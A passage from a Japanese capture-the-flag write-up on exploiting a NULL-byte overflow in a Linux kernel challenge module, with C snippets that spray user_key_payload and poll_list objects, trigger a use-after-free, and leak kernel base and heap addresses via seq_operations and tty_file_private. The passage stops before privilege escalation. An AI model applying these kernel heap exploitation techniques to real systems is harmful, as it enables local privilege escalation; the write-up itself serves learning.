</span></span></code></pre></div><p>はい。<a href=https://man7.org/linux/man-pages/man2/add_key.2.html>manpage</a>によると、<code>keyring</code>, <code>user</code>, <code>logon</code>, <code>bigkey</code>という4種類の鍵があります。そしてそのそれぞれについてfopsみたいな<code>struct key_type</code>構造体が結びついています。このハンドラの中の、ユーザ入力ペイロードをパースする関数である<code>.preparse</code>は、<code>user</code>タイプの場合<code>user_preparse()</code>関数に成っています。<code>user_preparse()</code>は、<code>user_key_payload</code>構造体を<code>kmalloc</code>します。この構造体はこれまた可変サイズを持ち、最大<code>sizeof(struct user_key_payload) + 32767</code>までの任意のサイズをユーザ指定で確保することができます。解放も、ユーザが任意のタイミングで行うことができます(<a href=https://man7.org/linux/man-pages/man3/keyctl_revoke.3.html><code>keyctl_revoke</code></a>)。<a href=https://man7.org/linux/man-pages/man3/keyctl_read.3.html>読むこと</a>も、できます。素晴らしい構造体ですね、全くどうやってこんなもんを見つけてくるのやら。おまけに、<strong>特筆すべきこととして最初のメンバである<code>rcu</code>は初期化されるまではもとの値が保たれるみたいです</strong>。ふぅ。</p><h2 id=kbase-leak-via-user_key_payload-and-seq_operations>kbase leak via <code>user_key_payload</code> and <code>seq_operations</code></h2><p>さて、これらの材料を使うとkernbaseがリークできそうです。細かい事は無視して大枠だけ考えます。
事前準備として、<code>add_key</code>を呼び出して<code>struct user_key_payload</code>を<code>kmalloc-32</code>に置いておきます。続いて、<code>poll</code>を542個(stackに置かれる30個 + kmalloc-4kに置かれる510個 + kmalloc-32に置かれる2個)のfdに対して呼び出します。そうすると、<code>stack --> kmalloc-4k --> kmalloc-32</code>の順に<code>struct poll_list</code>のリストが繋がれます。続いて、モジュールのプロックファイルに書き込むことで<code>cormon_proc_write()</code>を呼び出してNULL-byte overflowさせます。このときバッファは<code>kmalloc-4k</code>にとられるため、うまく行くと先程の<code>poll_list.next</code>ポインタの最後1byteがpartial overwriteされます。そして、そのアドレスがうまい具合だと、書き換えたあとのポインタが一番最初に準備した<code>user_key_payload</code>を指すことになります。続いて<code>poll_list</code>をfreeさせる(これはtimer expireでも、イベントを発生させるのでもどちらでもOK)ことで、リストにつながっている<code>user_key_payload</code>をfreeします。これで<code>user_key_payload</code>のUAF完成です。kbaseを読むために<code>seq_operations</code>らへんを確保して、<code>user_key_payload</code>の上に配置します。あとは<code>keyctl_read</code>でペイロードを読むことで、kbaseをleakできます。
というようにシナリオだけ文面で考えると簡単そうですが、「うまくいくと」と書いたところをうまくさせないといけませんね。まぁスプレーでなんとかなるでしょう。
さて、順を追ってやっていきましょう。まずは<code>add_key()</code>でkmalloc-32に鍵を置きます。なお、<code>add_key</code> syscallに対するglibc wrapperはないため、<code>libkeyutils-dev</code>等のパッケージをインストールしたあと、<code>-lkeyutils</code>を指定してビルドする必要があります。
雑にkeyをスプレーします:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-spray_keys.c data-lang=spray_keys.c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>spray_keys</span>() {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>desc <span style=color:#f92672>=</span> calloc(<span style=color:#ae81ff>0x100</span>, <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (desc <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;spray_keys malloc&#34;</span>);
</span></span><span style=display:flex><span>  strcpy(desc, DESC_KEY_TOBE_OVERWRITTEN_SEQOPS);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_KEY_SPRAY; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    memcpy(desc <span style=color:#f92672>+</span> strlen(DESC_KEY_TOBE_OVERWRITTEN_SEQOPS), <span style=color:#f92672>&amp;</span>ix, <span style=color:#ae81ff>4</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>key_payload <span style=color:#f92672>=</span> malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
</span></span><span style=display:flex><span>    memset(key_payload, <span style=color:#e6db74>&#39;A&#39;</span>, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
</span></span><span style=display:flex><span>    key_serial_t keyid0 <span style=color:#f92672>=</span> add_key(<span style=color:#e6db74>&#34;user&#34;</span>, desc, key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, KEY_SPEC_PROCESS_KEYRING);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (keyid0 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;add_key 0&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>すると、以下のようにヒープの中にそれらしい箇所が見つかります(<code>pt -ss AAAAAAAA -align 8 </code>)。きっとコレが<code>kmalloc-32</code>でしょう。needleとして仕込んだ<code>AAAAAAAA</code>というペイロードと、その直前がshortの<code>0x08</code>(<code>ushort datalen</code>)であることからもわかります:</p><p><img src=cj-heap.png alt="user_key_payload in kmalloc-32"></p><p>ところで、<code>user_key_payload</code>が連続していないことが見て取れますね。きっと、<code>CONFIG_SLAB_FREELIST_RANDOMIZE</code>らへんが有効化されているのでしょう。
続いて、<code>poll_list</code>を<code>kmalloc-4k</code>と<code>kmalloc-32</code>にスプレーしていきます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-alloc_poll_list.c data-lang=alloc_poll_list.c><span style=display:flex><span>  assign_to_core(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_POLLLIST_ALLOC; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(pthread_create(<span style=color:#f92672>&amp;</span>threads[ix], NULL, alloc_poll_list, <span style=color:#f92672>&amp;</span>just_fd) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;pthread_create&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span></code></pre></div><p><img src=search-polllist.png alt="search for poll_list"></p><p><img src=./polllist-4k.png alt="poll_list in kmalloc-4k"></p><p>今回はpollするイベントは<code>POLLERR</code>(<code>=0x0008</code>)で、使った<code>fd</code>は<code>0x00000004</code>なので、バイト列<code>0x0000000400080000</code>をニードルとして検索できます(<code>pt -sb 08000000040000000800000004000000 -align 16</code>。まぁ、<code>pt -sb fe01000004000000 -align 8</code>のほうが良さそう)。ところで、<code>struct poll_list</code>において、<code>struct pollfd[]</code>って8byteアラインされないんですね。おかげで<code>poll_list</code>がどこにも見つからない&mldr;!と発狂する羽目になりました。あ、ところでこの<code>pt</code>コマンドは<a href=https://github.com/martinradev/gdb-pt-dump>gdb-pt-dump</a>のことです。</p><p><img src=./pahole-pollfd.png alt="pahole of pollfd"></p><p><img src=./pahole-polllist.png alt="pahole of poll_list"></p><p>さぁさぁ、とりあえずは各構造体が意図したサイズのキャッシュに入っていることが分かりました。
この状態で、一旦NULL-byte overflowさせてみます:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-overflow.c data-lang=overflow.c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>nullbyte_overflow</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>  assert(cormon_fd <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>  memset(cormon_buf, <span style=color:#e6db74>&#39;B&#39;</span>, <span style=color:#ae81ff>0x1000</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20</span>);
</span></span><span style=display:flex><span>  strcpy((<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)cormon_buf <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;THIS_IS_CORMON_BUFFER&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>cormon_buf <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>(write(cormon_fd, cormon_buf, <span style=color:#ae81ff>0x1000</span>) <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) errExit(<span style=color:#e6db74>&#34;nullbyte_overflow&#34;</span>);
</span></span><span style=display:flex><span>  errno <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><img src=./search-polllist.png alt="search for NULL-overflowed poll_list"></p><p>うーん、確かに次のページ上のスラブオブジェクトがNULL-byte overflowされている感じはしますが、このオブジェクトは明らかに<code>struct poll_list</code>ではありません(<code>.len</code>メンバが不正)。色々と試してみた結果、<code>struct poll_list</code>を確保する回数を<code>0x10 -> 0x10-2</code>回にしたらいい感じになりました。スプレーでは大事、こういう小さい調整:</p><p><img src=./nullof.png alt="actually, poll_list is NULL-byte overflowed!"></p><p>確かに<code>cormon_proc_write()</code>で確保されたバッファと<code>struct poll_list</code>が隣接し、<code>poll_list.next</code>の先頭1byteがNULL-byte overflowされていることがわかりますね。因みに、writeupによると<code>sched_setaffinity()</code>を使ってどのコアを使うかをコントロールしたほうがいいらしいです。確かにスラブキャッシュはPERCPUだから、そっちのほうが良さそう。頭いいね！
さぁ、ここで重要なことは、overwriteされた<code>next</code>ポインタが指す先(<code>0xffff888007617500</code>)が最初に確保した<code>user_key_payload</code>になっているかどうか。且つ、最初のメンバである<code>user_key_payload.rcu</code>がNULLであるかどうかですが&mldr;:</p><p><img src=./key-polllist.png alt="user_key_payload is pointed to by poll_list.next"></p><p>完璧ですね。これであとは数秒待って<code>poll</code>をタイムアウトさせることで、<code>poll_list</code>が先頭から順にfreeされていきます。<code>user_key_payload</code>もfreeされてしまいます。よって、こいつの上に新しく何らかの構造体を置いてあげましょう。<code>kmalloc-32</code>に入っていて、且つkptrを含んでいるものなら何でもいいです。今回は<code>seq_operations</code>を使ってみます:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-seq_operations.c data-lang=seq_operations.c><span style=display:flex><span>  <span style=color:#75715e>// Check all keys to leak kbase via `seq_operations`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> keybuf[<span style=color:#ae81ff>0x100</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
</span></span><span style=display:flex><span>  ulong leaked <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_KEY_SPRAY; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    memset(keybuf, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x100</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(keyctl_read(keys[ix], keybuf, <span style=color:#ae81ff>0x100</span>) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;keyctl_read&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (strncmp(keybuf, <span style=color:#e6db74>&#34;AAAA&#34;</span>, <span style=color:#ae81ff>4</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>      leaked <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(ulong<span style=color:#f92672>*</span>)keybuf;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (leaked <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;[-] Failed to leak kbase&#34;</span>);
</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;[!] leaked: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, leaked);
</span></span></code></pre></div><p><img src=./panic.png alt="panic, but leak fails"></p><p>う〜〜〜ん、panicしているので確実に悪いことはできているのですが上手くleakはできていません。gdbで見てみましょう:</p><p><img src=./dbg1.png alt="the former is overflowed poll_list, the latter is user_key_payload as seq_operations"></p><p>前半がoverflowされた<code>poll_list</code>、後半が<code>poll_list.next</code>に指されたためにfreeされて<code>user_key_payload</code>から<code>seq_operations</code>になったもの。う〜ん、一見すると良さそうですけどね。とりあえず一番最初にもっと<code>kmalloc-32</code>を飽和させておいたほうがいいんじゃないかと思い、<code>user_key_payload</code>をもっとスプレーしようとしたところ、以下のエラーになりました:</p><p><img src=./disk-quota.png alt="Disk quota exceeded"></p><p>詳しくは見ていないけど、鍵はあんまり多くは確保できなさそうなので代わりに<code>seq_operations</code>でもっとスプレーしておくようにしました。それから、<code>pthread_join()</code>する度にすぐさま<code>seq_operations</code>を確保するようにしました。しかしながら、やっぱり<code>keyctl_read()</code>でleakできない！！</p><p><img src=./spray.png alt="somehow, kernel pointer cannot be leaked&amp;hellip;"></p><p>しばらく悩んだあと<code>keyctl_read</code>のmanpageを呼んでみると以下の記述が:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-keyctl_read.man data-lang=keyctl_read.man><span style=display:flex><span>RETURN VALUE
</span></span><span style=display:flex><span>       On  success  keyctl_read()  returns  the amount of data placed into the buffer.  If the buffer was too small, then the size of
</span></span><span style=display:flex><span>       buffer required will be returned, and the contents of the buffer may have been overwritten in some undefined way.
</span></span></code></pre></div><p>あ、バッファサイズが小さい場合には、undefinedな動作が起こるらしい&mldr;。ということで、<code>keyctl_read()</code>に渡すバッファサイズを十分大きく(>=0x4330)してもう一度やってみると:</p><p><img src=./lgtm.png alt="kbase leak success after extending buf size!"></p><p>よさそう！</p><h2 id=leak-kheap-via-tty_struct--tty_file_private>leak kheap via <code>tty_struct</code> / <code>tty_file_private</code></h2><p>kbase leakができました。さて、どうしよう。一瞬このまま<code>user_key_payload</code>であり且つ<code>seq_operations</code>でもあるオブジェクトを<code>user_key_payload</code>としてkfreeし、<code>setxattr</code>を使って<code>seq_operations</code>内のポインタを書き換えてやればRIPが取れるじゃんと思いましたが、KPTIがある都合上stack pivotする必要があり、<strong>heapのアドレスが必要</strong>であることに気が付きました。
とりあえずはheapのアドレスが欲しい。幸いにも、kbaseのleakに使った<code>user_key_payload</code>だったオブジェクトは、上に乗っている<code>seq_operations</code>を解放して他のオブジェクトにしてやることで再度leakをすることができます。というわけで、<code>tty_struct</code>を使いましょう。<code>/dev/ptmx</code>を開くと以下のパスに到達します:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-drivers/tty/pty.c data-lang=drivers/tty/pty.c><span style=display:flex><span><span style=color:#66d9ef>struct</span> tty_file_private {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> tty_struct <span style=color:#f92672>*</span>tty;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>file;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> list_head list;
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>ptmx_open</span>(<span style=color:#66d9ef>struct</span> inode <span style=color:#f92672>*</span>inode, <span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>filp)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> tty_struct <span style=color:#f92672>*</span>tty;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> retval;
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>    retval <span style=color:#f92672>=</span> tty_alloc_file(filp);
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>    tty <span style=color:#f92672>=</span> tty_init_dev(ptm_driver, index);
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>    tty_add_file(tty, filp);
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>tty_alloc_file</span>(<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>file)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> tty_file_private <span style=color:#f92672>*</span>priv;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    priv <span style=color:#f92672>=</span> kmalloc(<span style=color:#66d9ef>sizeof</span>(<span style=color:#f92672>*</span>priv), GFP_KERNEL);
</span></span><span style=display:flex><span>    file<span style=color:#f92672>-&gt;</span>private_data <span style=color:#f92672>=</span> priv;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>tty_add_file</span>(<span style=color:#66d9ef>struct</span> tty_struct <span style=color:#f92672>*</span>tty, <span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>file)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> tty_file_private <span style=color:#f92672>*</span>priv <span style=color:#f92672>=</span> file<span style=color:#f92672>-&gt;</span>private_data;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    priv<span style=color:#f92672>-&gt;</span>tty <span style=color:#f92672>=</span> tty;
</span></span><span style=display:flex><span>    priv<span style=color:#f92672>-&gt;</span>file <span style=color:#f92672>=</span> file;
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>ここで、<code>tty_alloc_file()</code>は<code>/dev/ptmx</code>の<code>struct file</code>の<code>private_data</code>メンバに対して<code>struct tty_file_private</code>を確保して入れます。これは<code>kmalloc-32</code>から確保されます。その後、<code>tty_init_dev()</code>で<code>struct tty_struct</code>を<code>kmalloc-1024</code>から確保します。そして、<code>tty_add_file()</code>で<code>struct tty_file_private</code>内に<code>struct tty_struct</code>のアドレスを格納します。つまり、<code>kmalloc-32</code>内の<code>tty_file_private</code>をleakすることで<code>kmalloc-1024</code>のアドレスをleakすることができます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-leak_heap.c data-lang=leak_heap.c><span style=display:flex><span>  <span style=color:#75715e>// Free all keys except UAFed key
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_KEY_SPRAY <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (keys[ix] <span style=color:#f92672>!=</span> uafed_key) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (keyctl_revoke(keys[ix]) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;keyctl_revoke&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (keyctl_unlink(keys[ix], KEY_SPEC_PROCESS_KEYRING) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;keyctl_unlink&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Place `tty_file_private` on UAFed `user_key_payload` in kmalloc-32
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_TTY_SPRAY; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (open(<span style=color:#e6db74>&#34;/dev/ptmx&#34;</span>, O_RDWR) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>2</span>) errExit(<span style=color:#e6db74>&#34;open tty&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Read `tty_file_private.tty` which points to `tty_struct` in kmalloc-1024
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  memset(keybuf, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x5000</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>(keyctl_read(uafed_key, keybuf, <span style=color:#ae81ff>0x5000</span>) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;keyctl_read&#34;</span>);
</span></span><span style=display:flex><span>  ulong km1024_leaked <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  ulong <span style=color:#f92672>*</span>tmp <span style=color:#f92672>=</span> (ulong<span style=color:#f92672>*</span>)keybuf <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0x4330</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ((tmp[ix] <span style=color:#f92672>&gt;&gt;</span> (<span style=color:#ae81ff>64</span><span style=color:#f92672>-</span><span style=color:#ae81ff>4</span><span style=color:#f92672>*</span><span style=color:#ae81ff>4</span>)) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xFFFF</span> <span style=color:#f92672>&amp;&amp;</span> tmp[ix<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>] <span style=color:#f92672>==</span> tmp[ix<span style=color:#f92672>+</span><span style=color:#ae81ff>3</span>] <span style=color:#f92672>&amp;&amp;</span> tmp[ix<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> (tmp[ix] <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFF</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x00</span>) { <span style=color:#75715e>// list_head&#39;s next and prev are same
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      km1024_leaked <span style=color:#f92672>=</span> tmp[ix];
</span></span><span style=display:flex><span>      printf(<span style=color:#e6db74>&#34;[!] </span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>+0: 0x%lx (tty)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tmp[ix]);
</span></span><span style=display:flex><span>      printf(<span style=color:#e6db74>&#34;[!] </span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>+1: 0x%lx (*file)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tmp[ix <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>      printf(<span style=color:#e6db74>&#34;[!] </span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>+2: 0x%lx (list_head.next)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tmp[ix <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>]);
</span></span><span style=display:flex><span>      printf(<span style=color:#e6db74>&#34;[!] </span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>+3: 0x%lx (list_head.prev)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tmp[ix <span style=color:#f92672>+</span> <span style=color:#ae81ff>3</span>]);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (km1024_leaked <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;Failed to leak kmalloc-1024&#34;</span>);
</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;[!] leaked kmalloc-1024: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, km1024_leaked);
</span></span></code></pre></div><p><img src=./not-success.png alt="kheap leak success&amp;hellip;?"></p><p>良さそう！と思いきや、実際に表示された<code>tty</code>のアドレスを見てみると、先頭がマジックナンバー(<code>0x5401</code>)ではなかったため違うポインタでした。何度試してみても、<code>tty</code>と思わしきものは50回に1回程度しかleakできない&mldr;。うーん、何が悪いのか。UAFされた<code>user_key_payload</code>以外のkeyをfreeして代わりに<code>tty_file_private</code>を置いたあとの<code>user_key_payload</code>が以下の感じ:</p><p><img src=./heap3.png alt="UAFed user_key_payload in kmalloc-32"></p><p>先頭32byteが<code>user_key_payload</code>で、上にはkbaseのleakに使った<code>seq_operations</code>が乗っかっています。leakできるのは<code>user_key_payload</code>よりも下の<code>0x4330</code>byte程度(これは、<code>seq_operations</code>をUAFで乗せた際に、<code>user_key_payload.datalen</code>が<code>single_next</code>のアドレスの下2byteである<code>4330</code>で上書きされるため)であるため見てみると、<code>seq_operations</code>の名残がいくつか見えますね。<code>0xa748dc1b1f063d98</code>は、おそらくフリーなスラブオブジェクト内のリストポインタが暗号化(<code>CONFIG_SLAB_FREELIST_HARDENED</code>)されているやつでしょう。このことから考えられることとしては、keyのスプレーが少なくてキャッシュ内がkeyで満たされる前に同じ領域に<code>seq_operations</code>が入ってきてしまったことが考えられます。よって、スプレーするkeyを増やしてみたところ以下の感じ:</p><p><img src=./heap4.png alt="kmalloc-32 after increasing num of spraying"></p><p>偶然のような気もしますが、ランダムなQWORD(つまり、暗号化されたスラブのポインタ)と<code>0x41414141</code>(keyのペイロードとして入れた値)が同一オブジェクト内に入っているため、keyとして割り当てられていたオブジェクトがフリーされていることが分かります。しかし、フリーされたままということは<code>tty_file_private</code>をスプレーする数が少なかったということでしょうか。少し増やしてみましたが、やはりできません。悲しい。
ここで自分のコードを見てみると&mldr;:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#define NUM_KEY_SPRAY 80 + 10
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_POLLFD 30 + 510 + 1 </span><span style=color:#75715e>// stack, kmalloc-4k, kmalloc-32
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#define NUM_POLLLIST_ALLOC 0x10 - 0x1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>key_serial_t keys[NUM_KEY_SPRAY <span style=color:#f92672>*</span> <span style=color:#ae81ff>5</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_KEY_SPRAY <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>; <span style=color:#f92672>++</span>ix) {...}
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_KEY_SPRAY <span style=color:#f92672>*</span> <span style=color:#ae81ff>9</span>; <span style=color:#f92672>++</span>ix) {...}
</span></span></code></pre></div><p><strong>馬鹿！！大馬鹿！おまわりさん、馬鹿はこいつです！捕まえちゃってください！</strong> マクロなんて所詮文字列置換なので、<code>NUM_KEY_SPRAY * 2</code>は<code>80 + 10 * 2</code>と評価されてしまいます！どうりで思った動きしないわけだよ！
